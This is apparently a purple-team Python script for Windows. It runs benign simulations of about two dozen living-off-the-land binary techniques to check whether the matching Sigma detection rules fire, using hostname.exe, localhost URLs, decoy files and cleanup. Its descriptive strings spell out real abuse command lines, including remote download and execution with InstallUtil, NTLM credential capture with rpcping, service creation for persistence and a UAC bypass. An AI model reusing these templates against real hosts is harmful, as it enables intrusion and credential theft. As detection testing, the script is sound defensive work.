import glob
import hashlib
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path

KEEP_RESULTS_LOG = True
CANARY_TAG = f"PURPLE-TEAM-TEST-{datetime.now().strftime('%Y%m%d%H%M%S')}"
SAFE_SOURCE_BINARY = r"C:\Windows\System32\hostname.exe"
SAFE_PARENT_BINARY = r"C:\Windows\System32\cmd.exe"
DROP_ARTIFACT_FILES = True
APPINSTALLER_FAKE_DIR = r"C:\Program Files\WindowsApps\LolbasTestSigma"

LOLBIN_TEST_CASES = {
    "winrm.vbs": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml | id: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0",
        "lolbas": "cscript.exe winrm.vbs invoke Create wmicimv2/Win32_Process -r:http://<target> -- lateral movement via WinRM VBScript API",
        "condition": "Image endswith \\cscript.exe + CLI|contains|all: 'winrm', 'invoke Create wmicimv2/Win32_', '-r:http'",
        "real_path": r"C:\Windows\System32\cscript.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: [r"C:\Windows\System32\winrm.vbs", "invoke",
                        "Create", "wmicimv2/Win32_Process",
                        "-r:http://127.0.0.1/",
                        f"@{{CommandLine=\"{SAFE_SOURCE_BINARY}\"}}"],
        ],
    },
    "OneDriveStandaloneUpdater.exe": {
        "spawn_style": "registry_write",
        "sigma": "registry_set_lolbin_onedrivestandaloneupdater.yml | id: 3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d",
        "lolbas": "Write URL to UpdateRingSettingURLFromOC registry value -- OneDriveStandaloneUpdater silently downloads the file (T1105)",
        "condition": "TargetObject|contains '\\SOFTWARE\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC' (Sysmon 13 / WinSec 4657)",
        "hive": "HKCU",
        "reg_key": r"SOFTWARE\Microsoft\OneDrive\UpdateOfficeConfig",
        "reg_value": "UpdateRingSettingURLFromOC",
        "reg_data_template": "http://127.0.0.1/{CANARY_TAG}.json",
    },
    "Msconfig.exe": {
        "spawn_style": "parent_child",
        "decoy_name": "msconfig.exe",
        "sigma": "proc_creation_win_msconfig_suspicious_child.yml",
        "lolbas": "msconfig.exe Tools tab can launch arbitrary processes; any unexpected child of msconfig.exe is suspicious",
        "condition": "ParentImage endswith \\msconfig.exe AND child is NOT in {mmc.exe, WerFault.exe}",
        "artifact": None,
        "args_variants": [lambda wd: []],
    },
    "Dctask64.exe": {
        "spawn_style": "direct",
        "decoy_name": "dctask64.exe",
        "sigma": "proc_creation_win_dctask64_arbitrary_command_and_dll_execution.yml | id: 6345b048-8441-43a7-9bed-541133633d7a",
        "lolbas": "dctask64.exe executecmd64 <cmd> | invokeexe <exe> | injectDll <dll> -- ZOHO ManageEngine signed binary abuse (T1218)",
        "condition": "Image endswith \\dctask64.exe + CLI|contains ' executecmd64 ' | ' invokeexe ' | ' injectDll '",
        "artifact": None,
        "args_variants": [
            lambda wd: ["executecmd64", SAFE_SOURCE_BINARY],
            lambda wd: ["invokeexe", SAFE_SOURCE_BINARY],
        ],
    },
    "Sc.exe": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_sc_create_service.yml | id: 85ff530b-261d-48c6-a441-facaa2e81e48",
        "lolbas": "sc.exe create <name> binPath=<binary> -- service creation for persistence / privilege escalation (T1543.003)",
        "condition": "Image endswith \\sc.exe + CLI|contains|all: 'create', 'binPath'",
        "real_path": r"C:\Windows\System32\sc.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: ["create", "LolbasSigmaTest", f"binPath={SAFE_SOURCE_BINARY}"],
            lambda wd: ["delete", "LolbasSigmaTest"],
        ],
    },
    "Ldifde.exe": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_ldifde_export.yml (4f7a6757) + proc_creation_win_ldifde_file_load.yml (6f535e01)",
        "lolbas": "ldifde -f <file.ldf> -- AD structure export (T1087.002); ldifde -i -f <file> -- arbitrary LDAP/file import (T1105)",
        "condition": "Image endswith \\ldifde.exe + CLI|contains '-f' NOT '-i' (export) | '-i' AND '-f' (import/download)",
        "real_path": r"C:\Windows\System32\ldifde.exe",
        "artifact": "ldifde_import.ldf",
        "args_variants": [
            lambda wd: ["-f", str(wd / "ldifde_out.ldf")],
            lambda wd: ["-i", "-f", str(wd / "ldifde_import.ldf")],
        ],
    },
    "UtilityFunctions.ps1": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_lolbin_utilityfunctions.yml | id: 0403d67d-6227-4ea8-8145-4e72db7da120",
        "lolbas": "UtilityFunctions.ps1 + RegSnapin proxy-loads managed DLL via Microsoft-signed PowerShell script (T1216)",
        "condition": "CommandLine|contains: 'UtilityFunctions.ps1' | 'RegSnapin '",
        "real_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-NoProfile", "-Command", "Get-Help UtilityFunctions.ps1"],
            lambda wd: ["-NoProfile", "-Command", "Write-Host 'RegSnapin proxy-test'"],
        ],
    },
    "GfxDownloadWrapper.exe": {
        "spawn_style": "direct",
        "decoy_name": "GfxDownloadWrapper.exe",
        "sigma": "proc_creation_win_gfxdownloadwrapper_arbitrary_file_download.yml | id: eee00933-a761-4cd0-be70-c42fe91731e7",
        "lolbas": "GfxDownloadWrapper.exe <url> <dest> -- Intel GPU driver utility abused for arbitrary file download (T1105)",
        "condition": "Image endswith \\GfxDownloadWrapper.exe + CLI|contains 'https://' AND NOT 'gameplayapi.intel.com'",
        "artifact": None,
        "args_variants": [
            lambda wd: ["https://127.0.0.1/lolbas_sigma_test.bin", str(wd / "gfx_download.bin")],
        ],
    },
    "Aspnet_Compiler.exe": {
        "spawn_style": "real_binary_dynamic",
        "sigma": "proc_creation_win_aspnet_compiler_susp_paths.yml | id: 9f50fe98-fe5c-4a2d-86c7-fad7f63ed622",
        "lolbas": "aspnet_compiler.exe -v none -p <SuspPath> -- compile and execute C# code from suspicious directory (T1127)",
        "condition": "Image in .NET\\Framework* endswith \\aspnet_compiler.exe + CLI|contains '\\AppData\\Local\\Temp\\'",
        "search_globs": [
            r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe",
            r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe",
        ],
        "decoy_name": "aspnet_compiler.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-v", "none", "-p", str(wd), "-f", str(wd / "none_output"), "-u"],
        ],
    },
    "reg.exe": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_reg_susp_paths.yml | id: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
        "lolbas": "reg.exe targeting Winlogon / WDigest / Windows Defender keys -- credential theft / defense evasion (T1112/T1562.001)",
        "condition": "Image endswith \\reg.exe + CLI|contains sensitive key paths (Winlogon, WDigest, Defender)",
        "real_path": r"C:\Windows\System32\reg.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: ["query", r"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"],
            lambda wd: ["query", r"HKLM\CurrentControlSet\Control\SecurityProviders\WDigest"],
            lambda wd: ["query", r"HKLM\SOFTWARE\Microsoft\Windows Defender"],
        ],
    },
    "Cscript-Wscript.exe": {
        "spawn_style": "wscript_child",
        "sigma": "proc_creation_win_wscript_cscript_susp_child_processes.yml | id: b6676963-0353-4f88-90f5-36c20d443c6a",
        "lolbas": "wscript.exe/cscript.exe spawning cmd.exe/powershell.exe -- common malware execution chain (T1059.005)",
        "condition": "ParentImage endswith \\wscript.exe | \\cscript.exe + child is cmd.exe / powershell.exe / pwsh.exe",
        "artifact": "lolbas_spawn.vbs",
    },
    "Extexport.exe": {
        "spawn_style": "direct",
        "decoy_name": "Extexport.exe",
        "sigma": "proc_creation_win_extexport_execution.yml",
        "lolbas": "extexport.exe <folder> <dll1> <dll2> -- DLL sideloading from specified folder (T1218)",
        "condition": "Image endswith \\Extexport.exe -- any execution is flagged (name-only rule)",
        "artifact": None,
        "args_variants": [
            lambda wd: [str(wd), "mozcrt19.dll", "mozsqlite3.dll"],
        ],
    },
    "AppInstaller.exe": {
        "spawn_style": "appinstaller_child",
        "sigma": "proc_creation_win_susp_appx_execution.yml",
        "lolbas": "Rogue .appx / AppInstaller.exe from WindowsApps spawning cmd/powershell -- AppX package abuse (T1218.005)",
        "condition": "ParentImage startswith 'C:\\Program Files\\WindowsApps\\' + child is cmd/cscript/powershell/wscript/regsvr32/rundll32",
    },
    "InfDefaultInstall.exe": {
        "spawn_style": "direct",
        "decoy_name": "InfDefaultInstall.exe",
        "sigma": "proc_creation_win_infdefaultinstall_execute_sct_scripts.yml",
        "lolbas": "InfDefaultInstall.exe <file>.inf -- execute SCT COM scriptlet via .inf AWL bypass (T1218)",
        "condition": "CommandLine|contains|all: 'InfDefaultInstall.exe', '.inf'",
        "artifact": "decoy_infinstall.inf",
        "args_variants": [
            lambda wd: [str(wd / "decoy_infinstall.inf")],
        ],
    },
    "Esentutl.exe": {
        "spawn_style": "direct",
        "decoy_name": "esentutl.exe",
        "sigma": "proc_creation_win_esentutl_susp_params.yml",
        "lolbas": "esentutl.exe /y <source> /d <dest> /o -- file copy via ESE database engine (T1005/T1003)",
        "condition": "Image endswith \\esentutl.exe + CLI|contains '/y' + suspicious path",
        "artifact": "decoy_esentutl.edb",
        "args_variants": [
            lambda wd: ["/y", str(wd / "decoy_esentutl.edb"), "/d", str(wd / "decoy_esentutl_out.edb"), "/o"],
        ],
    },
    "Rasautou.exe": {
        "spawn_style": "direct",
        "decoy_name": "rasautou.exe",
        "sigma": "proc_creation_win_lolbin_rasautou_dll_execution.yml",
        "lolbas": "rasautou.exe -d <dll> -p <export> -- RAS AutoDial Manager used to load DLL and call named export (T1218)",
        "condition": "Image endswith \\rasautou.exe + CLI|contains|all: '-d', '-p'",
        "artifact": "decoy_ras.dll",
        "args_variants": [
            lambda wd: ["-d", str(wd / "decoy_ras.dll"), "-p", "DllEntryPoint"],
        ],
    },
    "InstallUtil.exe": {
        "spawn_style": "direct",
        "decoy_name": "InstallUtil.exe",
        "sigma": "proc_creation_win_installutil_download.yml",
        "lolbas": "InstallUtil.exe https://<target>/payload.dll -- download and execute .NET assembly bypass (T1218.004)",
        "condition": "Image endswith \\InstallUtil.exe + CLI|contains 'http://' | 'https://'",
        "artifact": None,
        "args_variants": [
            lambda wd: ["https://127.0.0.1/decoy_assembly.dll"],
            lambda wd: ["/logfile=", "/LogToConsole=false", "/U", "https://127.0.0.1/decoy_uninstall.dll"],
        ],
    },
    "Cmd.exe": {
        "spawn_style": "rename_real_multi",
        "sigma": "proc_creation_win_renamed_binary.yml | id: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142",
        "lolbas": "Masquerading (T1036.003): real Windows binaries copied and executed under non-standard names",
        "condition": "OriginalFileName in {Cmd.Exe, net.exe, wevtutil.exe} AND Image NOT endswith the standard expected name",
        "artifact": None,
        "sources": [
            (SAFE_PARENT_BINARY, "update_helper.exe", ["/c", "exit"]),
            (r"C:\Windows\System32\net.exe", "net_svc_helper.exe", ["help"]),
            (r"C:\Windows\System32\wevtutil.exe", "evtutil_update.exe", ["qe", "Application", "/c:1"]),
        ],
    },
    "Provlaunch.exe": {
        "spawn_style": "cli_only",
        "sigma": "proc_creation_win_registry_provlaunch_provisioning_command.yml | id: 2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25",
        "lolbas": "provlaunch.exe reads HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands and launches configured binary (T1218)",
        "condition": "CommandLine|contains 'SOFTWARE\\Microsoft\\Provisioning\\Commands\\'",
        "artifact": None,
        "args_variants": [
            lambda wd: ["/simulate", r"SOFTWARE\Microsoft\Provisioning\Commands\ProvlaunchSigmaTest"],
        ],
    },
    "Eventvwr.exe": {
        "spawn_style": "cli_only",
        "sigma": "proc_creation_win_uac_bypass_eventvwr_recentviews.yml | id: 30fc8de7-d833-40c4-96b6-28319fbc4f6c",
        "lolbas": "Eventvwr.exe UAC bypass via mscfile association hijack / RecentViews redirect (T1548.002)",
        "condition": "CommandLine|contains '\\Event Viewer\\RecentViews' | '\\EventV~1\\RecentViews'",
        "artifact": None,
        "args_variants": [
            lambda wd: [">", r"C:\Users\Public\AppData\Local\Microsoft\EventV~1\RecentViews"],
        ],
    },
    "Certoc.exe": {
        "spawn_style": "direct",
        "decoy_name": "certoc.exe",
        "sigma": "proc_creation_win_certoc_load_dll.yml | id: 242301bc-f92f-4476-8718-78004a6efd9f",
        "lolbas": "certoc.exe -LoadDLL <path.dll> -- proxy DLL loading via Certificate Operator utility (T1218)",
        "condition": "Image endswith \\certoc.exe + CLI|contains ' -LoadDLL '",
        "artifact": "decoy_certoc.dll",
        "args_variants": [
            lambda wd: ["-LoadDLL", str(wd / "decoy_certoc.dll")],
        ],
    },
    "Rpcping.exe": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_rpcping_credential_capture.yml | id: 93671f99-04eb-4ab4-a161-70d446a84003",
        "lolbas": "rpcping -s <target> -e 999 -a privacy -u NTLM -t ncacn_np -- forced NTLM auth credential capture (T1003)",
        "condition": "Image endswith \\RpcPing.exe + CLI|contains '-s' AND ('-u NTLM' OR '-t ncacn_np')",
        "real_path": r"C:\Windows\System32\rpcping.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-s", "127.0.0.1", "-e", "999", "-a", "privacy", "-u", "NTLM", "-t", "ncacn_np"],
        ],
    },
    "Pester.bat": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_lolbin_pester_1.yml | id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e",
        "lolbas": "Pester.bat proxies PowerShell test framework to bypass application whitelisting (T1216)",
        "condition": "Image endswith \\powershell.exe + CLI|contains 'Pester' AND 'Get-Help'",
        "real_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-NoProfile", "-Command", "Import-Module Pester; Get-Help"],
        ],
    },
    "Pcalua.exe": {
        "spawn_style": "real_binary",
        "sigma": "proc_creation_win_lolbin_pcalua.yml | id: 0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2",
        "lolbas": "pcalua.exe -a <binary> -- execute arbitrary binary via Program Compatibility Assistant (AWL bypass T1059)",
        "condition": "Image endswith \\pcalua.exe + CLI|contains ' -a'",
        "real_path": r"C:\Windows\System32\pcalua.exe",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-a", SAFE_SOURCE_BINARY],
            lambda wd: ["-a", SAFE_SOURCE_BINARY, "-c", f"echo {CANARY_TAG}"],
        ],
    },
}


def sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def sweep_stray_runs():
    removed = []
    for p in Path(tempfile.gettempdir()).glob("lolbas24_*"):
        if p.is_dir():
            shutil.rmtree(p, ignore_errors=True)
            if not p.exists():
                removed.append(str(p))
    return removed


def verified_cleanup(work_dir):
    shutil.rmtree(work_dir, ignore_errors=True)
    if not work_dir.exists():
        return True, []
    leftover = []
    for p in work_dir.rglob("*"):
        if p.is_file():
            try:
                p.unlink()
            except Exception:
                leftover.append(str(p))
    try:
        work_dir.rmdir()
    except Exception:
        pass
    return (not work_dir.exists()), leftover


def run_and_classify(cmd, cwd=None, timeout=15):
    try:
        proc = subprocess.Popen(
            [str(x) for x in cmd],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=cwd
        )
        pid = proc.pid
        try:
            proc.communicate(timeout=timeout)
            return f"exited on its own (rc={proc.returncode})", pid
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return f"did not exit within {timeout}s -- killed", pid
    except OSError as e:
        if getattr(e, "winerror", None) == 5:
            return "BLOCKED (WinError 5 -- EDR/AV prevention fired)", None
        return f"launch error: {e}", None
    except Exception as e:
        return f"error: {e}", None


def casing_variants(name):
    seen, out = set(), []
    for v in [name.lower(), name, name.upper()]:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def log_and_run(log, canonical_name, style, variant, cmd, cwd):
    print(f"    v{variant}: {' '.join(str(x) for x in cmd)}")
    ts = datetime.now().isoformat()
    status, pid = run_and_classify(cmd, cwd=cwd)
    print(f"         -> {status}  pid={pid}")
    log.append({
        "name": canonical_name, "spawn_style": style, "variant": str(variant),
        "timestamp": ts, "command": " ".join(str(x) for x in cmd),
        "status": status, "pid": pid,
    })
    time.sleep(0.75)


def main():
    if platform.system() != "Windows":
        print("Windows only -- exiting without doing anything.")
        sys.exit(1)

    for binary in [SAFE_SOURCE_BINARY, SAFE_PARENT_BINARY]:
        if not Path(binary).exists():
            print(f"Cannot find {binary} -- aborting.")
            sys.exit(1)

    source_hash = sha256_of(SAFE_SOURCE_BINARY)
    parent_hash = sha256_of(SAFE_PARENT_BINARY)

    stray = sweep_stray_runs()
    if stray:
        print(f"Swept {len(stray)} leftover folder(s) from previous run.\n")

    work_dir = Path(tempfile.mkdtemp(prefix="lolbas24_"))
    print("=" * 78)
    print("LOLBAS Tester v3 -- 24 LOLBins (new + re-validated), all SigmaHQ sourced")
    print("=" * 78)
    print(f"Canary tag     : {CANARY_TAG}")
    print(f"hostname SHA256: {source_hash}")
    print(f"Working dir    : {work_dir}")
    print(f"  (\\AppData\\Local\\Temp\\ -- satisfies Sigma path-based conditions)\n")

    for fname in ["ldifde_import.ldf", "ldifde_out.ldf",
                  "decoy_esentutl.edb", "decoy_ras.dll",
                  "decoy_certoc.dll", "decoy_infinstall.inf"]:
        p = work_dir / fname
        if not p.exists():
            p.write_text(f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\nCanary: {CANARY_TAG}\n")

    log = []
    appinstaller_fake_path = None

    try:
        for canonical_name, cfg in LOLBIN_TEST_CASES.items():
            print(f"{'=' * 60}")
            print(f"[*] {canonical_name}  [{cfg['spawn_style']}]")
            print(f"    Sigma  : {cfg['sigma']}")
            print(f"    LOLBAS : {cfg['lolbas']}")
            print(f"    Cond   : {cfg['condition']}")
            print()

            style = cfg["spawn_style"]

            if DROP_ARTIFACT_FILES and cfg.get("artifact"):
                p = work_dir / cfg["artifact"]
                if not p.exists():
                    p.write_text(
                        f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\nCanary: {CANARY_TAG}\n"
                    )

            if style == "real_binary":
                real_path = cfg["real_path"]
                if not Path(real_path).exists():
                    print(f"    SKIPPED -- {real_path} not found on this host")
                    print()
                    continue
                for i, args_fn in enumerate(cfg["args_variants"], start=1):
                    log_and_run(log, canonical_name, style, i,
                                [real_path] + args_fn(work_dir), None)
                print()
                continue

            if style == "real_binary_dynamic":
                matches = []
                for pattern in cfg["search_globs"]:
                    matches.extend(glob.glob(pattern))
                matches.sort()
                if matches:
                    base_path = matches[-1]
                    print(f"    using REAL binary: {base_path}")
                else:
                    decoy = work_dir / cfg["decoy_name"]
                    shutil.copy2(SAFE_SOURCE_BINARY, decoy)
                    if sha256_of(decoy) != source_hash:
                        print(f"    [{cfg['decoy_name']}] hash mismatch -- ABORTED")
                        print()
                        continue
                    base_path = str(decoy)
                    print(f"    real binary not found, using decoy: {base_path}")
                for i, args_fn in enumerate(cfg["args_variants"], start=1):
                    log_and_run(log, canonical_name, style, i,
                                [base_path] + args_fn(work_dir), None)
                print()
                continue

            if style == "registry_write":
                reg_exe = r"C:\Windows\System32\reg.exe"
                reg_key_full = f"{cfg['hive']}\\{cfg['reg_key']}"
                reg_data = cfg["reg_data_template"].replace("{CANARY_TAG}", CANARY_TAG)
                write_cmd = [reg_exe, "add", reg_key_full,
                             "/v", cfg["reg_value"],
                             "/t", "REG_SZ", "/d", reg_data, "/f"]
                print(f"    v1 (write key -- triggers Sysmon registry_set / Win Security 4657):")
                log_and_run(log, canonical_name, style, 1, write_cmd, None)
                del_cmd = [reg_exe, "delete", reg_key_full,
                           "/v", cfg["reg_value"], "/f"]
                print(f"    v2 (delete key -- cleanup):")
                log_and_run(log, canonical_name, style, 2, del_cmd, None)
                print()
                continue

            if style == "parent_child":
                for case_name in casing_variants(cfg["decoy_name"]):
                    decoy = work_dir / case_name
                    shutil.copy2(SAFE_PARENT_BINARY, decoy)
                    if sha256_of(decoy) != parent_hash:
                        print(f"    [{case_name}] hash mismatch -- ABORTED")
                        continue
                    cmd_list = [str(decoy), "/c", SAFE_SOURCE_BINARY]
                    print(f"    [{case_name}] ParentImage will be: {case_name}")
                    log_and_run(log, canonical_name, style, case_name, cmd_list, None)
                print()
                continue

            if style == "rename_real_multi":
                for source_path, decoy_name, fixed_args in cfg["sources"]:
                    if not Path(source_path).exists():
                        print(f"    [{decoy_name}] SKIPPED -- source not found: {source_path}")
                        continue
                    src_hash = sha256_of(source_path)
                    for case_name in casing_variants(decoy_name):
                        decoy = work_dir / case_name
                        shutil.copy2(source_path, decoy)
                        if sha256_of(decoy) != src_hash:
                            print(f"    [{case_name}] hash mismatch -- ABORTED")
                            continue
                        log_and_run(log, canonical_name, style, case_name,
                                    [str(decoy)] + fixed_args, None)
                print()
                continue

            if style == "cli_only":
                for i, args_fn in enumerate(cfg["args_variants"], start=1):
                    log_and_run(log, canonical_name, style, i,
                                [SAFE_SOURCE_BINARY] + args_fn(work_dir), None)
                print()
                continue

            if style == "wscript_child":
                vbs_path = work_dir / cfg["artifact"]
                vbs_path.write_text(
                    'Set objShell = CreateObject("WScript.Shell")\r\n'
                    f'objShell.Run "cmd.exe /c {SAFE_SOURCE_BINARY}", 0, True\r\n'
                )
                for engine in [r"C:\Windows\System32\wscript.exe",
                               r"C:\Windows\System32\cscript.exe"]:
                    engine_name = Path(engine).name
                    if not Path(engine).exists():
                        print(f"    [{engine_name}] SKIPPED -- not found")
                        continue
                    print(f"    [{engine_name}] child will be cmd.exe (parent={engine_name}):")
                    log_and_run(log, canonical_name, style, engine_name,
                                [engine, str(vbs_path)], None)
                print()
                continue

            if style == "appinstaller_child":
                fake_dir = Path(APPINSTALLER_FAKE_DIR)
                try:
                    fake_dir.mkdir(parents=True, exist_ok=True)
                    fake_binary = fake_dir / "AppInstaller.exe"
                    shutil.copy2(SAFE_PARENT_BINARY, fake_binary)
                    if sha256_of(fake_binary) != parent_hash:
                        print(f"    hash mismatch on AppInstaller decoy -- ABORTED")
                        print()
                        continue
                    appinstaller_fake_path = fake_binary
                    print(f"    ParentImage: {fake_binary}")
                    print(f"    (startswith 'C:\\Program Files\\WindowsApps\\' -- Sigma condition met)")
                    log_and_run(log, canonical_name, style, 1,
                                [str(fake_binary), "/c", SAFE_SOURCE_BINARY], None)
                except PermissionError:
                    print(f"    SKIPPED -- cannot write to {fake_dir} (run as Administrator)")
                except Exception as e:
                    print(f"    SKIPPED -- {e}")
                print()
                continue

            if style == "direct":
                blocked_globally = False
                for case_name in casing_variants(cfg["decoy_name"]):
                    if blocked_globally:
                        break
                    decoy = work_dir / case_name
                    shutil.copy2(SAFE_SOURCE_BINARY, decoy)
                    if sha256_of(decoy) != source_hash:
                        print(f"    [{case_name}] hash mismatch -- ABORTED")
                        continue
                    for i, args_fn in enumerate(cfg["args_variants"], start=1):
                        cmd_list = [str(decoy)] + args_fn(work_dir)
                        print(f"    [{case_name}]", end=" ")
                        log_and_run(log, canonical_name, style, i, cmd_list, None)
                        if "BLOCKED" in log[-1]["status"]:
                            blocked_globally = True
                            break
                print()
                continue

    finally:
        if appinstaller_fake_path:
            try:
                shutil.rmtree(APPINSTALLER_FAKE_DIR, ignore_errors=True)
            except Exception:
                pass

        try:
            subprocess.run(
                [r"C:\Windows\System32\sc.exe", "delete", "LolbasSigmaTest"],
                capture_output=True, timeout=10
            )
        except Exception:
            pass

        cleaned, leftover = verified_cleanup(work_dir)

    print("=" * 78)
    print(f"CLEANUP: {work_dir} removed = {cleaned}")
    if not cleaned:
        for f in leftover:
            print(f"  STUCK: {f}")
    print("=" * 78 + "\n")

    if KEEP_RESULTS_LOG:
        results_file = Path.cwd() / f"lolbas24_results_{CANARY_TAG}.json"
        with open(results_file, "w") as f:
            json.dump({
                "canary_tag": CANARY_TAG,
                "hostname_sha256": source_hash,
                "work_dir_cleaned": cleaned,
                "results": log,
            }, f, indent=2)
        print(f"Results saved: {results_file}")

    blocked = sum(1 for e in log if "BLOCKED" in e.get("status", ""))
    print(f"\nSearch your SIEM/Sigma backend for canary tag: {CANARY_TAG}")
    print(f"EDR blocked: {blocked} event(s)")
    print(f"Total events generated: {len(log)}")


if __name__ == "__main__":
    main()
